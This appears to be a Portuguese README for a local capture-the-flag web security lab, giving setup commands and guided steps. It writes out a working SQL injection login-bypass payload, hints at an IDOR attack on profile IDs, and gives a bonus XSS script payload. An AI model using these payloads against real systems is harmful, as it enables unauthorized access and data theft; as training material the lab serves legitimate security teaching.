# VulnFlags Lab v4 - SQLi encadeado com IDOR

Todos os dados são sintéticos. Execute somente em localhost ou rede isolada.

## Subir
```bash
docker compose down --remove-orphans
docker compose build --no-cache
docker compose up -d --force-recreate
docker compose logs --tail=30
```
Acesse `http://127.0.0.1:5000`.

## Etapa 1: SQL Injection
No campo usuário:
```text
' OR role='admin' -- 
```
Senha: qualquer valor.

Flag SQLi:
```text
CPF 123.456.789-00
```
A conclusão libera o Portal Financeiro e abre `/profile/1`.

## Etapa 2: IDOR
Após a SQLi, o portal abre o perfil autorizado da sessão.

Analise o identificador usado na URL e verifique se outros objetos podem ser acessados sem validação de propriedade. Um dos perfis contém dados fictícios de Alberto e valores financeiros elevados.

Regra da flag: use os 3 primeiros números do CPF e o saldo inteiro, removendo símbolo de moeda, pontos, vírgula e centavos.

Máscara apresentada ao participante:
```text
FLAG{CPF3_SALDO}
```

A resposta pronta não é exibida na interface.

## XSS bônus
```html
<script>fetch('/api/xss-flag',{headers:{'X-XSS-Lab':'executed'}}).then(r=>r.text()).then(alert)</script>
```
